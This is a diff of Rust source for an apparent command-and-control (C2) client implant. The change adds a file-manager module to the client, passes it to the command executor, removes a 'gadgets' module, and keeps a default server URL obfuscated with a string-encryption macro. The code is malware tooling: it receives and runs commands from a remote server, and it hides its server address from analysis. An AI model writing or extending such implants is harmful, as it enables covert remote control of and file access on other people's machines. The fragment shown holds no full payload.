@@ -2,30 +2,34 @@ use reqwest::Client;
 use std::time::Duration;
 use tokio::time::sleep;
 
+mod check;
 mod client_info;
 mod command_executor;
-mod gadgets;
-mod check;
+mod file_manager;
 
+use crate::file_manager::ClientFileManager;
 use common::config::ClientConfig;
 use common::error::C2Result;
-use common::message::{CommandRequest, Message, MessageType};
+use common::message::{CommandRequest, Message, MessageType}; // New: Import ClientFileManager
 
 /// C2 Client
 pub struct C2Client {
     config: ClientConfig,
     http_client: Client,
     client_info: common::message::ClientInfo,
+    file_manager: ClientFileManager, // New: Add file_manager to C2Client
 }
 
 impl C2Client {
     pub async fn new(config: ClientConfig) -> C2Result<Self> {
         let client_info = client_info::build_client_info(config.client_id.clone()).await?;
+        let file_manager = ClientFileManager::new(); // New: Initialize ClientFileManager
 
         Ok(Self {
             config,
             http_client: Client::new(),
             client_info,
+            file_manager, // New: Assign file_manager
         })
     }
 
@@ -110,6 +114,7 @@ impl C2Client {
                     &self.config.server_url,
                     &self.client_info.id,
                     cmd,
+                    &self.file_manager,
                 )
                 .await
                 {
@@ -133,9 +138,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     let args: Vec<String> = std::env::args().collect();
-    let server_url = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
-        cryptify::encrypt_string!("http://localhost:8080").to_string()
-    });
+    let server_url = args
+        .get(1)
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| cryptify::encrypt_string!("http://localhost:8080").to_string());
 
     let config = ClientConfig::default();
     let mut client = C2Client::new(ClientConfig {
